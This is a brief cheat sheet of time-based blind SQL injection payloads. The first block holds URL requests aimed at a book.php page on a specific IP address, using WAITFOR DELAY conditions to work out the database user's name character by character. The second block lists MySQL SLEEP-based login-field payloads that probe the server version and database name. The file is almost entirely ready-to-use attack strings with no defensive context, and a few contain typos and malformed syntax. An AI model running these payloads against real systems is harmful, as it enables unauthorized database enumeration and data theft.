#### Timbe Base SQL Injection

```
http://45.77.162.239/book.php?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/book.php?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/book.php?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 

#Identify 1st Characte

http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  

#To Identify 2nd Character
http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   
http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   
```
### Time Base SQL Injection sleep operator
```
iron man 'AND sleep(60)#
Admin 'or sleep(5)#
123 'or sleep(5)#
iron man 'AND 2111=2111

iron man' AND IF(substring(VERSION(),1,1) = '5', SLEEP(10), 0)#
iron man' AND IF(MID(VERSION(),1,1) = '5', SLEEP(10), 0)#
iron man' AND IF(substr(@@version,1,1)='5',),SLEEP(10),0)#
iron man' AND IF(MID(VERSION(),1,1) = '4', SLEEP(10), 0)#
iron man' AND IF(substr(@@version,1,1)='4'),SLEEP(10),0)#

#Database Name:
Admin 'AND (select sleep(10) from dual where database() like '%')#
Admin 'AND (select sleep(10) from dual where database() like '%')#
```

```
